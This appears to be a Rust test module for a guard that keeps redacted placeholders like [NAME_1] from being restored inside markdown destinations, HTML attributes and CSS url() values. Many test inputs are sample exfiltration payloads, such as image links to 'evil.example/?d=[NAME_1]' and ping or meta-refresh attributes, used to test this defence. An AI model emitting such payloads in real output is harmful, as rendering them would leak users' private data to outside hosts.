    #[test]
    fn saturated_readings_guard_the_line_and_keep_a_pending_destination() {
        let many = "](x(".repeat(MAX_THREADS + 1);
        let label = "\\](x(".repeat(MAX_THREADS);
        let cases = [
            // Too many readings: the rest of the line is guarded, the next
            // line is not.
            format!("{many}⟨[NAME_1] y [NAME_1]⟩\n«[NAME_1]»"),
            format!("{many}⟨[NAME_1]⟩\r«[NAME_1]»"),
            format!("x {many}⟨ <[NAME_1]>⟩\r\n«[NAME_1]»"),
            // Triggers after saturation still start readings.
            format!("{many}⟨ ![x](//e/[NAME_1])⟩\n![y](⟨//e/[NAME_1]⟩) «[NAME_1]»"),
            // CommonMark §4.7: a label with escaped brackets saturates at
            // its `]:`; its destination on the next line is still guarded.
            format!("[{label}]:\n⟨//e/[NAME_1]⟩\n\n«[NAME_1]»"),
            format!("[{label}]: \r\n  ⟨//e/[NAME_1]⟩"),
            format!("> [{label}]:\n> ⟨//e/[NAME_1]⟩"),
        ];
        for case in &cases {
            assert!(saturates(case), "{case:?} does not saturate");
        }
        let refs: Vec<&str> = cases.iter().map(String::as_str).collect();
        check_cases(&refs);
    }

    #[test]
    fn markdown_destinations_follow_commonmark() {
        for (input, want) in [
            (
                "see ![x](https://evil.example/?d=[NAME_1]) and [NAME_1]",
                "see ![x](⟨https://evil.example/?d=[NAME_1]⟩) and [NAME_1]",
            ),
            // An escaped `>` does not close a pointy destination.
            (
                "![x](<//evil.example/?d=\\>[NAME_1]>) [NAME_1]",
                "![x](<⟨//evil.example/?d=\\>[NAME_1]⟩>) [NAME_1]",
            ),
            (
                "[x](<a b [NAME_1]>) [NAME_1]",
                "[x](<⟨a b [NAME_1]⟩>) [NAME_1]",
            ),
            ("[x](<a\r[NAME_1]>)", "[x](<⟨a⟩\r[NAME_1]>)"),
            // Unicode whitespace never ends a bare destination.
            (
                "![x](https://e/?d=\u{a0}[NAME_1]) [NAME_1]",
                "![x](⟨https://e/?d=\u{a0}[NAME_1]⟩) [NAME_1]",
            ),
            (
                "![x](https://e/?d=\u{3000}[NAME_1]) [NAME_1]",
                "![x](⟨https://e/?d=\u{3000}[NAME_1]⟩) [NAME_1]",
            ),
            // Balanced and escaped parentheses stay inside.
            ("[x](a(b)c[NAME_1]) z", "[x](⟨a(b)c[NAME_1]⟩) z"),
            ("[x](a\\)b[NAME_1]) z", "[x](⟨a\\)b[NAME_1]⟩) z"),
            (
                "[x]( //evil/[NAME_1] ) [NAME_1]",
                "[x]( ⟨//evil/[NAME_1]⟩ ) [NAME_1]",
            ),
            ("[NAME_1](note) [NAME_1]", "[NAME_1](⟨note⟩) [NAME_1]"),
            ("plain [NAME_1] text", "plain [NAME_1] text"),
        ] {
            assert_eq!(marked(&[input]), want, "{input}");
        }
    }

    #[test]
    fn reference_definitions_anywhere_on_a_line() {
        for (input, want) in [
            (
                "> [r]: //evil.example/?d=[NAME_1]\n\n![x][r]",
                "> [r]: ⟨//evil.example/?d=[NAME_1]⟩\n\n![x][r]",
            ),
            ("- [r]: //e/[NAME_1]\n", "- [r]: ⟨//e/[NAME_1]⟩\n"),
            ("1) [r]: //e/[NAME_1]\n", "1) [r]: ⟨//e/[NAME_1]⟩\n"),
            (
                "hi\r[r]: //e/[NAME_1]\r\r![x][r]",
                "hi\r[r]: ⟨//e/[NAME_1]⟩\r\r![x][r]",
            ),
            (
                "  [1]: <a b [NAME_1]>\n[NAME_1]",
                "  [1]: <⟨a b [NAME_1]⟩>\n[NAME_1]",
            ),
            // Over-protection is cheap: the value after `[x]:` stays a tag.
            ("[NAME_1]: [EMAIL_1] ok", "[NAME_1]: ⟨[EMAIL_1]⟩ ok"),
            ("a: [NAME_1]", "a: [NAME_1]"),
            // A label may span lines.
            (
                "[r\nx]: <//e/?d= [NAME_1]>\n![a][r x]",
                "[r\nx]: <⟨//e/?d= [NAME_1]⟩>\n![a][r x]",
            ),
            // An unterminated autolink is text: the `](` in it still starts
            // a destination after the line ending.
            ("<http:![i](\r[EMAIL_1] x", "<http⟨:![i](⟩\r⟨[EMAIL_1]⟩ x"),
            // HTML inside a failed markdown destination is still HTML.
            (
                "](< <img src=\"\n> [NAME_1]\">",
                "](<⟨ <img src=\"\n> [NAME_1]⟩\">",
            ),
        ] {
            assert_eq!(marked(&[input]), want, "{input:?}");
        }
    }

    #[test]
    fn autolinks_html_attributes_and_css() {
        for (input, want) in [
            (
                "<http:evil.example/?d=[NAME_1]> [NAME_1]",
                "<http⟨:evil.example/?d=[NAME_1]⟩> [NAME_1]",
            ),
            (
                "<link rel=preload imagesrcset=\"//e/?d=[NAME_1] 1x\">[NAME_1]",
                "<link rel=⟨preload⟩ imagesrcset=\"⟨//e/?d=[NAME_1] 1x⟩\">[NAME_1]",
            ),
            (
                "<a ping='//e/[NAME_1]' href=\"#\">x [NAME_1]</a>",
                "<a ping='⟨//e/[NAME_1]⟩' href=\"⟨#⟩\">x [NAME_1]</a>",
            ),
            (
                "<meta http-equiv=refresh content=\"0;url=//e/[NAME_1]\">",
                "<meta http-equiv=⟨refresh⟩ content=\"⟨0;url=//e/[NAME_1]⟩\">",
            ),
            (
                "<img src       \t   =\"//e/[NAME_1]\">",
                "<img src       \t   =\"⟨//e/[NAME_1]⟩\">",
            ),
            // Only HTML whitespace ends an unquoted value.
            (
                "<img src=//e/?d=\u{1}[NAME_1]>[NAME_1]",
                "<img src=⟨//e/?d=\u{1}[NAME_1]⟩>[NAME_1]",
            ),
            (
                "<style>@import\n\"//e/?[NAME_1]\";</style>",
                "<style>@import⟨\n\"//e/?[NAME_1]\"⟩;</style>",
            ),
            (
                "<style>@import \"//e/[NAME_1]\"; p{}</style>",
                "<style>@import⟨ \"//e/[NAME_1]\"⟩; p{}</style>",
            ),
            (
                "x{background:url('//e/?x=)[NAME_1]')} [NAME_1]",
                "x{background:url(⟨'//e/?x=)[NAME_1]'⟩)} [NAME_1]",
            ),
            (
                "x{background:url(\n'//e/[NAME_1]')} [NAME_1]",
                "x{background:url(⟨\n'//e/[NAME_1]'⟩)} [NAME_1]",
            ),
            (
                "x{b:image-set(\"//e/[NAME_1]\" 1x)} [NAME_1]",
                "x{b:image-set(⟨\"//e/[NAME_1]\" 1x⟩)} [NAME_1]",
            ),
        ] {
            assert_eq!(marked(&[input]), want, "{input:?}");
        }
    }

    #[test]
    fn any_split_gives_the_same_parts() {
        let text = "a ![i](<https://e/?q=\\>[NAME_1]>) b <img src='x[NAME_1]'> [NAME_1]\n\
                    > [r]: /y/[NAME_1] c\r[s]: <q r>\nurl(\"a)\" [NAME_1]) <http:x[NAME_1]> z";
        let whole = marked(&[text]);
        let chars: Vec<char> = text.chars().collect();
        for n in 1..9 {
            let pieces: Vec<String> = chars.chunks(n).map(|c| c.iter().collect()).collect();
            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
            assert_eq!(marked(&refs), whole, "pieces of {n}");
        }
    }

    /// Replaces `[NAME_1]` with `Ravi`, holding back an unclosed `[` run;
    /// records what it was told to skip.
    struct Fake(String, String);

    impl ValueRestorer for Fake {
        fn push(&mut self, text: &str) -> String {
            self.0.push_str(text);
            let cut = self.0.rfind('[').filter(|&i| !self.0[i..].contains(']'));
            let keep = cut.map_or(String::new(), |i| self.0.split_off(i));
            let out = std::mem::replace(&mut self.0, keep);
            out.replace("[NAME_1]", "Ravi")
        }
        fn finish(&mut self) -> String {
            std::mem::take(&mut self.0).replace("[NAME_1]", "Ravi")
        }
        fn pending_len(&self) -> usize {
            self.0.len()
        }
        fn skip(&mut self, text: &str) {
            self.1.push_str(text);
        }
    }

    #[test]
    fn guarded_restore_keeps_tags_in_urls() {
        let mut g = Guarded::new(Fake(String::new(), String::new()));
        let mut out = String::new();
        for piece in [
            "Hi [NA",
            "ME_1], see ![x](https://e/?d=[NA",
            "ME_1]) and [NAME_1]",
        ] {
            out.push_str(&g.push(piece));
        }
        out.push_str(&g.finish());
        assert_eq!(out, "Hi Ravi, see ![x](https://e/?d=[NAME_1]) and Ravi");
        assert_eq!(g.inner.1, "https://e/?d=[NAME_1]");
    }
}
